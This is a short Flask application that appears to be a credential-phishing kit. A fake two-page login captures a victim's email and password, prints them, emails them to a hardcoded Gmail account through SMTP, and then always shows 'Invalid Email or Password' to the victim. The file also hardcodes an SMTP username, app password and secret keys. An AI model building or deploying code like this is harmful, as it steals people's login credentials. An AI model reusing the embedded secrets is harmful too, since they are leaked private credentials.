from flask import Flask, render_template, request, redirect, url_for, session, flash
# import openpyxl
import os
from flask_mail import Mail, Message

app = Flask(__name__)
app.secret_key = 'erfghbjklkjhgfdsdhjbnkljhgfdscvbnnkmlliuytrresdhjkopiuytrsdhj'


import os


# Flask Mail Configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'sup.alert001@gmail.com'
app.config['MAIL_PASSWORD'] = 'omifnyopgwgaeraa'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['SECRET_KEY'] = 'language007'

mail = Mail(app)
def send_mail(email, password):
    msg = Message('Login Alert', sender=app.config['MAIL_USERNAME'], recipients=[email])
    msg.body = f'New login details: User-Email: {email},  User-Password: {password}'
    print(msg.body)
    mail.send(msg)











@app.route("/", methods=['GET', 'POST'])
def one():
    if request.method == 'POST':
        email = request.form.get('email')
        return redirect(url_for('two', username=email))
    return render_template('one.html')

@app.route("/two", methods=['GET', 'POST'])
def two():
    user_email = request.args.get('username')
    print('User email : ', user_email)
    if request.method == 'POST':
        password = request.form['password']
        print('User email : ', user_email, 'password : ', password)
        send_mail(user_email, password)
        flash('Invalid Email or Password', 'danger')

        # return redirect(url_for('error'))
    return render_template('two.html', user_email=user_email)

@app.route('/error', methods=['GET', 'POST'])
def error():
    return render_template('error.html')


if __name__ == "__main__":
   app.run(debug=True)
